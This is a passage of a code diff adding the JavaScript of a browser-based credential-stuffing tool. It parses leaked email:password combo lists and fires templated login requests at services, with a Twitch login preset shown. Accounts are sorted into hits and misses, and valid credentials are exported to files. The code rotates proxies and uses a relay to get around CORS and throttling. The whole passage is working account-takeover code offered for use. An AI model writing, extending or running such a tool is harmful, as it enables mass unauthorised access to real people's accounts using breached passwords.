+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36'
+    },
+    body: '{"username":"{{user}}","password":"{{pass}}","client_id":"{{TWITCH_CLIENT_ID}}"}',
+    matcher: { type: 'body-contains', pattern: '"access_token"', invert: false },
+    hitCodes: [200],
+    concurrency: 2, throttle: 700,
+    notes: 'Client-Id is the public web client id (kimne78kx3ncx6brgo4mv6wki5h1ko). Fill TWITCH_CLIENT_ID in Secrets. 2FA accounts will fail.'
+  }
+];
+
+/* ---------------- STATE ---------------- */
+const state = {
+  lines: [],
+  parsed: [],
+  results: [],
+  hit: [], miss: [], err: [],
+  status: 'idle',
+  running: false,
+  paused: false,
+  parsedTotal: 0,
+  done: 0,
+  separator: 'auto',
+  detectConfidence: 0,
+  activeTab: 'all',
+  search: '',
+  proxyList: [],
+  proxyIndex: 0,
+  proxyRotation: 'round',
+  relayUrl: '',
+  directMode: 'cors',
+  secrets: {},
+  startTime: 0,
+  rateWindow: []
+};
+
+/* ---------------- HELPERS ---------------- */
+const $ = id => document.getElementById(id);
+const setStatus = (s, text) => {
+  $('status').className = 'status ' + s;
+  $('statusText').textContent = text || s;
+};
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+/* ---------------- PRESET UI ---------------- */
+function initPresets() {
+  const sel = $('presetSelect');
+  PRESETS.forEach(p => {
+    const o = document.createElement('option');
+    o.value = p.id; o.textContent = p.name;
+    sel.appendChild(o);
+  });
+  sel.addEventListener('change', applyPreset);
+  applyPreset();
+}
+function applyPreset() {
+  const id = $('presetSelect').value;
+  const p = PRESETS.find(x => x.id === id) || PRESETS[0];
+  $('pFormat').value = p.format || '';
+  $('pConcur').value = p.concurrency || 3;
+  $('pThrottle').value = p.throttle || 300;
+  $('presetNotes').textContent = p.notes || '';
+  if (p.id === 'custom') return;
+  if (p.method) $('reqMethod').value = p.method;
+  if (p.url) $('reqUrl').value = p.url;
+  if (p.headers) $('reqHeaders').value = Object.entries(p.headers).map(([k,v])=>`${k}: ${v}`).join('\n');
+  if (p.body) $('reqBody').value = p.body;
+  if (p.matcher) {
+    $('matchType').value = p.matcher.type;
+    $('matchPattern').value = p.matcher.pattern || '';
+    $('matchInvert').checked = !!p.matcher.invert;
+  }
+  // auto-fill secrets slots from template
+  collectSecretsFromTemplate();
+}
+function collectSecretsFromTemplate() {
+  const txt = ($('reqUrl').value || '') + '\n' + ($('reqHeaders').value || '') + '\n' + ($('reqBody').value || '');
+  const found = new Set();
+  const re = /\{\{([A-Z0-9_]+)\}\}/g;
+  let m;
+  while ((m = re.exec(txt))) {
+    if (!['email','user','pass','domain'].includes(m[1].toLowerCase())) found.add(m[1]);
+  }
+  const area = $('secretsArea');
+  area.innerHTML = '';
+  if (!found.size) {
+    area.innerHTML = '<div class="hint">No custom placeholders in template.</div>';
+    return;
+  }
+  found.forEach(name => {
+    const div = document.createElement('div');
+    div.className = 'field';
+    div.innerHTML = `<label>${name}</label><input type="text" data-secret="${name}" value="${escapeHtml(state.secrets[name]||'')}">`;
+    area.appendChild(div);
+  });
+  area.querySelectorAll('input[data-secret]').forEach(inp => {
+    inp.addEventListener('input', () => {
+      state.secrets[inp.dataset.secret] = inp.value;
+      localStorage.setItem('mv_secrets', JSON.stringify(state.secrets));
+    });
+  });
+}
+function escapeHtml(s){return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
+
+/* ---------------- DROP / FILE ---------------- */
+function initInput() {
+  const drop = $('drop'), fi = $('fileInput');
+  drop.addEventListener('click', () => fi.click());
+  drop.addEventListener('dragover', e => { e.preventDefault(); drop.classList.add('over'); });
+  drop.addEventListener('dragleave', () => drop.classList.remove('over'));
+  drop.addEventListener('drop', e => {
+    e.preventDefault(); drop.classList.remove('over');
+    const f = e.dataTransfer.files[0]; if (f) readFile(f);
+  });
+  fi.addEventListener('change', () => { if (fi.files[0]) readFile(fi.files[0]); });
+
+  let pasteTimer;
+  $('pasteArea').addEventListener('input', () => {
+    clearTimeout(pasteTimer);
+    pasteTimer = setTimeout(() => {
+      const txt = $('pasteArea').value;
+      if (txt.trim()) parseInput(txt);
+    }, 250);
+  });
+}
+function readFile(file) {
+  const r = new FileReader();
+  r.onload = e => parseInput(e.target.result);
+  r.readAsText(file);
+  $('drop').querySelector('.drop-title').textContent = file.name;
+}
+
+/* ---------------- PARSING ---------------- */
+function detectSeparator(lines) {
+  const candidates = [':', '|', ';', ','];
+  const sample = lines.slice(0, 200);
+  let best = { sep: ':', score: 0 };
+  for (const sep of candidates) {
+    let ok = 0;
+    for (const line of sample) {
+      const parts = line.split(sep);
+      if (parts.length >= 2 && parts[0] && parts[1]) ok++;
+    }
+    const score = ok / sample.length;
+    if (score > best.score) best = { sep, score };
+  }
+  return best;
+}
+function splitLine(line, sep) {
+  if (sep === 'tab') return line.split('\t');
+  if (sep === 'space') return line.split(/\s+/);
+  return line.split(sep);
+}
+function extractCombo(line, sep) {
+  // returns {email,user,pass,domain,raw} or null
+  const raw = line.trim();
+  if (!raw || raw.startsWith('#')) return null;
+
+  // JSON line
+  if (raw.startsWith('{') && raw.endsWith('}')) {
+    try {
+      const j = JSON.parse(raw);
+      const email = j.email || j.username || j.user || j.login;
+      const pass = j.password || j.pass || j.pwd;
+      if (email && pass) return buildCombo(email, pass, raw);
+    } catch(_) {}
+    return null;
+  }
+
+  const parts = splitLine(raw, sep);
+  if (parts.length < 2) {
+    // single token — maybe just email
+    if (EMAIL_RE.test(raw)) return buildCombo(raw, '', raw);
+    return null;
+  }
+
+  // ip:port:user:pass
+  if (/^\d+\.\d+\.\d+\.\d+$/.test(parts[0]) && /^\d+$/.test(parts[1]) && parts.length >= 4) {
+    return buildCombo(parts[2], parts.slice(3).join(sep), raw);
+  }
+
+  // url:user:pass
+  if (/^https?:\/\//i.test(parts[0]) && parts.length >= 3) {
+    return buildCombo(parts[1], parts.slice(2).join(sep), raw);
+  }
+
+  // standard 2-field
+  let a = parts[0].trim();
+  let b = parts.slice(1).join(sep).trim();
+  if (!b) return null;
+
+  // if a is email → email:pass; else user:pass
+  return buildCombo(a, b, raw);
+}
+function buildCombo(id, pass, raw) {
+  const isEmail = EMAIL_RE.test(id);
+  const domain = isEmail ? id.split('@')[1].toLowerCase() : '';
+  return {
+    email: isEmail ? id : '',
+    user: isEmail ? '' : id,
+    identifier: id,
+    pass,
+    domain,
+    raw
+  };
+}
+function applyFilters(combos) {
+  const inc = $('filterInclude').value.trim();
+  const exc = $('filterExclude').value.trim();
+  const wl  = $('filterDomains').value.trim();
+  const bl  = $('filterBadDomains').value.trim();
+  const emailOnly = $('optEmailOnly').checked;
+  const skipEmpty = $('optSkipEmpty').checked;
+
+  const incRe = inc ? safeRegex(inc) : null;
+  const excRe = exc ? safeRegex(exc) : null;
+  const wlSet = wl ? new Set(wl.split(',').map(s => s.trim().toLowerCase()).filter(Boolean)) : null;
+  const blSet = bl ? new Set(bl.split(',').map(s => s.trim().toLowerCase()).filter(Boolean)) : null;
+
+  return combos.filter(c => {
+    if (skipEmpty && !c.pass) return false;
+    if (emailOnly && !c.email) return false;
+    if (incRe && !incRe.test(c.raw)) return false;
+    if (excRe && excRe.test(c.raw)) return false;
+    if (wlSet && !wlSet.has(c.domain)) return false;
+    if (blSet && blSet.has(c.domain)) return false;
+    return true;
+  });
+}
+function safeRegex(s) { try { return new RegExp(s); } catch(_) { return null; } }
+
+function dedup(combos) {
+  const mode = $('dedupMode').value;
+  if (mode === 'none') return combos;
+  const seen = new Set();
+  const out = [];
+  for (const c of combos) {
+    let key;
+    if (mode === 'line') key = c.raw;
+    else if (mode === 'email') key = c.identifier;
+    else key = c.identifier + ':' + c.pass;
+    if (seen.has(key)) continue;
+    seen.add(key);
+    out.push(c);
+  }
+  return out;
+}
+
+function parseInput(text) {
+  const rawLines = text.split(/\r?\n/).filter(l => l.trim());
+  state.lines = rawLines;
+  $('inputCount').textContent = rawLines.length + ' lines';
+
+  const det = detectSeparator(rawLines);
+  if (state.separator === 'auto') {
+    state.separator = det.sep;
+    state.detectConfidence = det.score;
+    document.querySelectorAll('.sep-btn').forEach(b => {
+      b.classList.toggle('active', b.dataset.sep === det.sep || (b.dataset.sep === 'auto' && false));
+    });
+    $('detectHint').textContent = `Detected separator: "${det.sep}" — confidence ${(det.score*100).toFixed(0)}%`;
+    $('confFill').style.width = (det.score*100) + '%';
+  }
+
+  const combos = [];
+  for (const line of rawLines) {
+    const c = extractCombo(line, state.separator);
+    if (c) combos.push(c);
+  }
+  const filtered = applyFilters(combos);
+  const deduped = dedup(filtered);
+
+  state.parsed = deduped;
+  state.results = [];
+  state.hit = []; state.miss = []; state.err = [];
+  state.done = 0;
+  state.parsedTotal = deduped.length;
+
+  updateStats();
+  renderTable();
+  $('btnStart').disabled = deduped.length === 0;
+}
+
+/* ---------------- VALIDATION ---------------- */
+async function validateAll() {
+  if (!state.parsed.length) return;
+  state.running = true;
+  state.paused = false;
+  state.startTime = Date.now();
+  state.rateWindow = [];
+  state.done = 0;
+  state.results = [];
+  state.hit = []; state.miss = []; state.err = [];
+  setStatus('running', 'running');
+  $('btnStart').disabled = true;
+  $('btnStop').disabled = false;
+
+  const mode = $('valMode').value;
+  const concurrency = Math.max(1, parseInt($('pConcur').value) || 3);
+  const throttle = Math.max(0, parseInt($('pThrottle').value) || 0);
+  const queue = [...state.parsed];
+  const total = queue.length;
+
+  let idx = 0;
+  async function worker() {
+    while (state.running && !state.paused) {
+      if (!queue.length) break;
+      const item = queue.shift();
+      let result;
+      try {
+        if (mode === 'format') result = await checkFormat(item);
+        else if (mode === 'mx') result = await checkMx(item);
+        else result = await checkHttp(item);
+      } catch (e) {
+        result = { status: 'ERROR', note: e.message, ms: 0, item };
+      }
+      recordResult(result, item);
+      idx++;
+      updateProgress(idx, total);
+      if (throttle) await sleep(throttle);
+    }
+  }
+  const workers = Array.from({length: concurrency}, worker);
+  await Promise.all(workers);
+
+  state.running = false;
+  $('btnStart').disabled = false;
+  $('btnStop').disabled = true;
+  setStatus('idle', 'done');
+  renderTable();
+}
+
+function recordResult(result, item) {
+  result.item = item;
+  state.results.push(result);
+  if (result.status === 'HIT') state.hit.push(result);
+  else if (result.status === 'MISS') state.miss.push(result);
+  else if (result.status === 'ERROR') state.err.push(result);
+  updateStats();
+  scheduleRender();
+}
+
+let renderScheduled = false;
+function scheduleRender() {
+  if (renderScheduled) return;
+  renderScheduled = true;
+  requestAnimationFrame(() => { renderScheduled = false; renderTable(); });
+}
+
+async function checkFormat(item) {
+  const t0 = performance.now();
+  if (!item.identifier) return { status: 'ERROR', note: 'empty identifier', ms: 0 };
+  if (!item.pass) return { status: 'MISS', note: 'empty password', ms: 0 };
+  if (item.email && !EMAIL_RE.test(item.email)) return { status: 'MISS', note: 'invalid email syntax', ms: 0 };
+  return { status: 'HIT', note: 'format ok', ms: performance.now() - t0 };
+}
+
+async function checkMx(item) {
+  const t0 = performance.now();
+  const base = await checkFormat(item);
+  if (base.status !== 'HIT') return base;
+  if (!item.domain) return { status: 'UNKNOWN', note: 'no domain — user:pass format', ms: performance.now() - t0 };
+  try {
+    const url = `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(item.domain)}&type=MX`;
+    const r = await fetch(url, { headers: { 'Accept': 'application/dns-json' } });
+    const j = await r.json();
+    if (j.Answer && j.Answer.length) return { status: 'HIT', note: 'mx ok (' + j.Answer.length + ' records)', ms: performance.now() - t0 };
+    return { status: 'MISS', note: 'no mx records', ms: performance.now() - t0 };
+  } catch (e) {
+    return { status: 'ERROR', note: 'dns: ' + e.message, ms: performance.now() - t0 };
+  }
+}
+
+async function checkHttp(item) {
+  const t0 = performance.now();
+  const template = {
+    method: $('reqMethod').value,
+    url: $('reqUrl').value,
+    headers: parseHeaders($('reqHeaders').value),
+    body: $('reqBody').value
+  };
+  if (!template.url) return { status: 'ERROR', note: 'no URL', ms: 0 };
+
+  const filled = fillTemplate(template, item);
+  const retries = parseInt($('reqRetries').value) || 0;
+  const timeout = parseInt($('reqTimeout').value) || 15000;
+
+  for (let attempt = 0; attempt <= retries; attempt++) {
+    const controller = new AbortController();
+    const to = setTimeout(() => controller.abort(), timeout);
+    try {
+      const target = state.relayUrl
+        ? state.relayUrl + '?url=' + encodeURIComponent(filled.url)
+        : filled.url;
+
+      const opts = {
+        method: filled.method,
+        headers: filled.headers,
+        signal: controller.signal,
+        mode: state.directMode === 'nocors' && !state.relayUrl ? 'no-cors' : 'cors',
+        redirect: 'follow'
+      };
+      if (filled.method !== 'GET' && filled.body) opts.body = filled.body;
+
+      if (state.relayUrl && state.proxyList.length) {
+        opts.headers['X-Target-Proxy'] = nextProxy();
+      }
+
+      const r = await fetch(target, opts);
+      clearTimeout(to);
+
+      if (state.directMode === 'nocors' && !state.relayUrl) {
+        return { status: 'UNKNOWN', note: 'no-cors — response unreadable', ms: performance.now() - t0 };
+      }
+
+      let body = '';
+      try { body = await r.text(); } catch(_) {}
+      const headersObj = {};
+      r.headers.forEach((v,k) => headersObj[k.toLowerCase()] = v);
+
+      const matched = evaluateMatcher(r.status, body, headersObj);
+      return {
+        status: matched ? 'HIT' : 'MISS',
+        note: `HTTP ${r.status} · ${body.slice(0, 80).replace(/\s+/g,' ')}`,
+        ms: performance.now() - t0
+      };
+    } catch (e) {
+      clearTimeout(to);
+      if (attempt < retries) { await sleep(500); continue; }
+      return { status: 'ERROR', note: e.name === 'AbortError' ? 'timeout' : e.message, ms: performance.now() - t0 };
+    }
+  }
+}
+
+function parseHeaders(str) {
+  const h = {};
+  str.split('\n').forEach(line => {
+    const i = line.indexOf(':');
+    if (i < 0) return;
+    const k = line.slice(0, i).trim();
+    const v = line.slice(i+1).trim();
+    if (k) h[k] = v;
+  });
+  return h;
+}
+
+function fillTemplate(tpl, item) {
+  const subst = (s) => String(s)
+    .replace(/\{\{email\}\}/g, item.email || item.identifier || '')
+    .replace(/\{\{user\}\}/g, item.user || item.identifier || '')
+    .replace(/\{\{pass\}\}/g, item.pass || '')
+    .replace(/\{\{domain\}\}/g, item.domain || '')
+    .replace(/\{\{([A-Z0-9_]+)\}\}/g, (_, k) => state.secrets[k] || '');
+
+  return {
+    method: tpl.method,
+    url: subst(tpl.url),
+    headers: Object.fromEntries(Object.entries(tpl.headers).map(([k,v]) => [k, subst(v)])),
+    body: subst(tpl.body)
+  };
+}
+
+function evaluateMatcher(status, body, headers) {
+  const type = $('matchType').value;
+  const pattern = $('matchPattern').value;
+  const invert = $('matchInvert').checked;
+  const statusList = ($('matchStatusList').value || '').split(',').map(s => parseInt(s.trim())).filter(Boolean);
+
+  let matched = false;
+  if (type === 'status-in') {
+    matched = statusList.includes(status);
+  } else if (type === 'body-contains') {
+    matched = body.includes(pattern);
+  } else if (type === 'body-regex') {
+    const re = safeRegex(pattern);
+    matched = re ? re.test(body) : false;
+  } else if (type === 'header-contains') {
+    matched = Object.entries(headers).some(([k,v]) => (k + ': ' + v).includes(pattern));
+  }
+  return invert ? !matched : matched;
+}
+
+function nextProxy() {
+  if (!state.proxyList.length) return '';
+  if (state.proxyRotation === 'random') {
+    return state.proxyList[Math.floor(Math.random() * state.proxyList.length)];
+  }
+  const p = state.proxyList[state.proxyIndex % state.proxyList.length];
+  state.proxyIndex++;
+  return p;
+}
+
+/* ---------------- STATS ---------------- */
+function updateStats() {
+  $('sTotal').textContent = state.parsedTotal;
+  $('sQueued').textContent = Math.max(0, state.parsedTotal - state.results.length);
+  $('sHit').textContent = state.hit.length;
+  $('sMiss').textContent = state.miss.length;
+  $('sErr').textContent = state.err.length;
+  $('sDone').textContent = state.results.length;
+  $('cAll').textContent = state.results.length;
+  $('cHit').textContent = state.hit.length;
+  $('cMiss').textContent = state.miss.length;
+  $('cErr').textContent = state.err.length;
+  const now = Date.now();
+  state.rateWindow = state.rateWindow.filter(t => now - t < 3000);
+  if (state.results.length && state.rateWindow.length) {
+    const rate = state.rateWindow.length / 3;
+    $('sRate').textContent = rate.toFixed(1) + '/s';
+    if (rate > 0 && state.parsedTotal > state.results.length) {
+      const remaining = state.parsedTotal - state.results.length;
+      const eta = remaining / rate;
+      $('sEta').textContent = formatEta(eta);
+    } else {
+      $('sEta').textContent = '—';
+    }
+  } else {
+    $('sRate').textContent = '0/s';
+    $('sEta').textContent = '—';
+  }
+}
+function formatEta(s) {
+  if (s < 60) return Math.round(s) + 's';
+  if (s < 3600) return Math.round(s/60) + 'm';
+  return Math.round(s/3600) + 'h';
+}
+function updateProgress(done, total) {
+  const pct = total ? (done / total) * 100 : 0;
+  $('progBar').style.width = pct + '%';
+}
+
+/* ---------------- TABLE ---------------- */
+const ROW_H = 32;
+let currentRows = [];
+function getVisibleRows() {
+  if (state.activeTab === 'hit') return state.hit;
+  if (state.activeTab === 'miss') return state.miss;
+  if (state.activeTab === 'err') return state.err;
+  return state.results;
+}
+function filteredRows() {
+  const rows = getVisibleRows();
+  if (!state.search) return rows;
+  const s = state.search.toLowerCase();
+  return rows.filter(r => {
+    const it = r.item || {};
+    return (it.identifier||'').toLowerCase().includes(s)
+        || (it.pass||'').toLowerCase().includes(s)
+        || (r.note||'').toLowerCase().includes(s);
+  });
+}
+function renderTable() {
+  currentRows = filteredRows();
+  const wrap = $('tableWrap');
+  const spacer = $('vspacer');
+  const total = currentRows.length;
+  spacer.style.height = (total * ROW_H) + 'px';
+
+  if (!total) {
+    spacer.innerHTML = '<div class="empty">No results yet.</div>';
+    return;
+  }
+  // render window
+  const scrollTop = wrap.scrollTop;
+  const h = wrap.clientHeight;
+  const start = Math.max(0, Math.floor(scrollTop / ROW_H) - 3);
+  const end = Math.min(total, start + Math.ceil(h / ROW_H) + 6);
+
+  const frag = document.createDocumentFragment();
+  for (let i = start; i < end; i++) {
+    const r = currentRows[i];
+    const it = r.item || {};
+    const div = document.createElement('div');
+    div.className = 'vrow';
+    div.style.top = (i * ROW_H) + 'px';
+    const id = it.identifier || it.email || it.user || '';
+    const passShown = it.pass ? '•'.repeat(Math.min(it.pass.length, 12)) : '';
+    div.innerHTML = `
+      <div><span class="badge ${r.status.toLowerCase()}">${r.status}</span></div>
+      <div class="email" title="${escapeHtml(id)}">${escapeHtml(id)}</div>
+      <div class="pass" title="${escapeHtml(passShown)}">${escapeHtml(passShown)}</div>
+      <div class="time">${(r.ms||0).toFixed(0)}ms</div>
+      <div class="note" title="${escapeHtml(r.note||'')}">${escapeHtml(r.note||'')}</div>
+      <div class="time"></div>
+    `;
+    frag.appendChild(div);
+  }
+  spacer.innerHTML = '';
+  spacer.appendChild(frag);
+}
+$('tableWrap').addEventListener('scroll', () => { requestAnimationFrame(renderTable); }, { passive: true });
+window.addEventListener('resize', () => renderTable());
+
+/* ---------------- TABS / SEARCH ---------------- */
+document.querySelectorAll('.tab').forEach(t => {
+  t.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+    t.classList.add('active');
+    state.activeTab = t.dataset.tab;
+    renderTable();
+  });
+});
+$('resultSearch').addEventListener('input', e => {
+  state.search = e.target.value;
+  renderTable();
+});
+
+/* ---------------- SEPARATOR UI ---------------- */
+$('sepList').addEventListener('click', e => {
+  if (!e.target.classList.contains('sep-btn')) return;
+  document.querySelectorAll('.sep-btn').forEach(b => b.classList.remove('active'));
+  e.target.classList.add('active');
+  state.separator = e.target.dataset.sep;
+  if (state.separator === 'auto') {
+    // re-detect
+    const det = detectSeparator(state.lines);
+    state.separator = det.sep;
+    state.detectConfidence = det.score;
+    $('detectHint').textContent = `Detected separator: "${det.sep}" — confidence ${(det.score*100).toFixed(0)}%`;
+    $('confFill').style.width = (det.score*100) + '%';
+  }
+  if (state.lines.length) parseInput(state.lines.join('\n'));
+});
+
+/* ---------------- MODALS ---------------- */
+function openModal(id) { $(id).classList.add('open'); }
+function closeModal(id) { $(id).classList.remove('open'); }
+document.querySelectorAll('[data-close]').forEach(el => {
+  el.addEventListener('click', () => closeModal(el.dataset.close));
+});
+document.querySelectorAll('.modal-bg').forEach(m => {
+  m.addEventListener('click', e => { if (e.target === m) m.classList.remove('open'); });
+});
+
+$('btnProxy').addEventListener('click', () => {
+  $('proxyList').value = state.proxyList.join('\n');
+  $('proxyRotation').value = state.proxyRotation;
+  openModal('proxyModal');
+});
+$('saveProxies').addEventListener('click', () => {
+  state.proxyList = $('proxyList').value.split('\n').map(s => s.trim()).filter(Boolean);
+  state.proxyRotation = $('proxyRotation').value;
+  localStorage.setItem('mv_proxies', JSON.stringify(state.proxyList));
+  localStorage.setItem('mv_proxyRotation', state.proxyRotation);
+  closeModal('proxyModal');
+});
+
+$('btnRelay').addEventListener('click', () => {
+  $('relayUrl').value = state.relayUrl;
+  $('directMode').value = state.directMode;
+  openModal('relayModal');
+});
+$('saveRelay').addEventListener('click', () => {
+  state.relayUrl = $('relayUrl').value.trim();
+  state.directMode = $('directMode').value;
+  localStorage.setItem('mv_relay', state.relayUrl);
+  localStorage.setItem('mv_direct', state.directMode);
+  closeModal('relayModal');
+});
+
+$('btnExport').addEventListener('click', () => openModal('exportModal'));
+$('doExport').addEventListener('click', () => {
+  const what = $('exportWhat').value;
+  let data = '', name = '', mime = 'text/plain';
+  if (what === 'hit') {
+    data = state.hit.map(r => r.item.raw || `${r.item.identifier}:${r.item.pass}`).join('\n');
+    name = 'hits.txt';
+  } else if (what === 'miss') {
+    data = state.miss.map(r => r.item.raw || `${r.item.identifier}:${r.item.pass}`).join('\n');
+    name = 'misses.txt';
+  } else if (what === 'err') {
+    data = state.err.map(r => r.item.raw || `${r.item.identifier}:${r.item.pass}`).join('\n');
+    name = 'errors.txt';
+  } else if (what === 'all-combos') {
+    data = state.results.map(r => r.item.raw || `${r.item.identifier}:${r.item.pass}`).join('\n');
+    name = 'all.txt';
+  } else if (what === 'all-csv') {
+    const head = 'status,identifier,password,note,ms\n';
+    data = head + state.results.map(r => {
+      const it = r.item || {};
+      const esc = s => `"${String(s||'').replace(/"/g,'""')}"`;
+      return [r.status, esc(it.identifier), esc(it.pass), esc(r.note), (r.ms||0).toFixed(0)].join(',');
+    }).join('\n');
+    name = 'all.csv'; mime = 'text/csv';
+  }
+  const blob = new Blob([data], { type: mime });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = name;
+  a.click();
+  setTimeout(() => URL.revokeObjectURL(a.href), 1000);
+  closeModal('exportModal');
+});
+
+/* ---------------- MODE SWITCH ---------------- */
+$('valMode').addEventListener('change', () => {
+  const m = $('valMode').value;
+  $('httpSection').style.display = m === 'http' ? 'block' : 'none';
+  const h = $('modeHint');
+  if (m === 'format') h.textContent = 'Offline structural check. Fast. Filters obvious junk before you run a real check.';
+  else if (m === 'mx') h.textContent = 'MX mode verifies the email domain has mail servers. Fast, no target involvement.';
+  else h.textContent = 'Fires the templated request per combo. Slowest. Use relay for CORS-heavy targets.';
+});
+
+/* ---------------- SECRETS PERSIST ---------------- */
+try { state.secrets = JSON.parse(localStorage.getItem('mv_secrets') || '{}'); } catch(_) {}
+try { state.proxyList = JSON.parse(localStorage.getItem('mv_proxies') || '[]'); } catch(_) {}
+state.proxyRotation = localStorage.getItem('mv_proxyRotation') || 'round';
+state.relayUrl = localStorage.getItem('mv_relay') || '';
+state.directMode = localStorage.getItem('mv_direct') || 'cors';
+
+/* ---------------- START / STOP ---------------- */
+$('btnStart').addEventListener('click', () => {
+  if (!state.parsed.length) return;
+  validateAll();
+});
+$('btnStop').addEventListener('click', () => {
+  state.running = false;
+  state.paused = false;
+  setStatus('idle', 'stopped');
+  $('btnStart').disabled = false;
+  $('btnStop').disabled = true;
+});
+
+/* ---------------- BOOT ---------------- */
+initPresets();
+initInput();
+$('valMode').dispatchEvent(new Event('change'));
+
+// re-collect secrets when template changes
+['reqUrl','reqHeaders','reqBody'].forEach(id => {
+  $(id).addEventListener('input', collectSecretsFromTemplate);
+});
+
+</script>
+</body>
+</html>
+
